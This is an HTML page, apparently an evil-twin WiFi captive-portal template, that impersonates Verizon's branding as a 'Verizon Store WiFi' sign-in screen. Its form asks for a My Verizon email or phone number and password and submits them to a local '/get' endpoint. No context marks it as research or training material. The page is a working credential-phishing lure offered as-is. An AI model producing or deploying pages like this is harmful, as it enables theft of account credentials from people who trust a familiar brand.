<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#1a1a1a;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.vlogo{text-align:center;margin-bottom:20px}
.vlogo h1{font-size:34px;font-weight:900;color:#fff;letter-spacing:-1px}
.vlogo h1 span{color:#CD040B}
.vlogo p{font-size:11px;color:#666;letter-spacing:1.5px;text-transform:uppercase;margin-top:4px}
.card{background:#fff;width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.4)}
.ch{background:#CD040B;padding:18px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:800;color:#fff}.ch p{font-size:12px;color:rgba(255,255,255,0.8);margin-top:3px}
.cb{padding:24px}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#CD040B;box-shadow:0 0 0 3px rgba(205,4,11,0.1)}
input::placeholder{color:#c0c0c0}
.forgot{display:block;text-align:right;font-size:12px;color:#CD040B;text-decoration:none;margin-top:8px}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#CD040B}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#CD040B;color:#fff;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px}
.foot{background:#f7f7f7;border-top:1px solid #eee;padding:12px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#CD040B;text-decoration:none}
</style>
</head>
<body>
<div class="vlogo"><h1>Veri<span>zon</span></h1><p>The network more people rely on</p></div>
<div class="card">
  <div class="ch"><h1>Verizon Store WiFi</h1><p>Sign in with your My Verizon account</p></div>
  <div class="cb">
    <form action="/get">
      <label class="lbl">My Verizon Email or Mobile Number</label>
      <input name="email" type="text" placeholder="you@example.com or 555-555-5555" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <a href="#" class="forgot">Forgot password?</a>
      <p class="terms">By connecting you agree to <a href="#">Verizon's Terms of Use</a>.</p>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
    </form>
  </div>
  <div class="foot"><span>&copy; Verizon</span><a href="#">Help</a></div>
</div>
</body>
</html>
